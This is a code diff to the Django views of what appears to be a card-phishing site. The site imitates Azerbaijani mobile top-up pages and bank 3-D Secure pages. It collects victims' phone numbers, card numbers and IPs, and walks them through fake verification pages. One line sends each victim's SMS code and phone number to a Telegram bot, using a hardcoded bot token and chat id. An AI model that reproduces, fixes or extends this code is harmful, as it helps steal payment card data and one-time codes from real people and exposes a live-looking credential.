@@ -53,7 +53,7 @@ def naxtel(request):
             return render(request, "pages/azercell.html",)
         client_ip = get_client_ip(request)
         contact = ContactModel(ip=client_ip, operator=operator, phone=number, amount=amount)
-        contact.page_name="/info"
+        contact.page_name="info"
         contact.save()
         request.session['operator'] = operator
         request.session['phone'] = number
@@ -87,7 +87,6 @@ def azercell(request):
         contact = ContactModel(ip=client_ip, operator=operator, phone=number, amount=amount)
         contact.page_name="/info"
         contact.save()
-        print(contact.id)
         request.session['operator'] = operator
         request.session['phone'] = number
         request.session['amount'] = amount
@@ -117,6 +116,7 @@ def bakcell(request):
 
 @ensure_csrf_cookie
 def info(request):
+    contact = None
     if request.method == "POST":
         cardnumber= request.POST.get("cardnumber")
         if validate_card_number(cardnumber) == False:
@@ -163,9 +163,11 @@ def info(request):
         'phone': phone,
         'amount': amount,
     }
+    contact = ContactModel(ip=get_client_ip(request), operator=operator, phone=phone, amount=amount)
     contact.page_name="/3dsec"
     contact.save()
     return render(request, 'pages/3dsec.html', context)
+
 def check_approval_status(request, contact_id):
     try:
         contact = ContactModel.objects.get(pk=contact_id)
@@ -401,7 +403,9 @@ def abb(request):
     'cc': contact.cc[-4:],
     "display":contact.hidden_type
     }
+    contact.page_name="/loading"
     contact.page_name="/abb3d"
+    
     contact.save()
     print(context)
     return render( request,'pages/abb3d.html' ,context)
@@ -425,8 +429,8 @@ def dsecazericard(request):
 
         }
         contact.bankname=""
-        contact.save()
         contact.page_name="/loading"
+        contact.save()
         response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{contact.id}\nPage:{request.path}\nsms:{contact.sms}|number{contact.phone}')
 
         return render( request,'pages/loading.html',context )
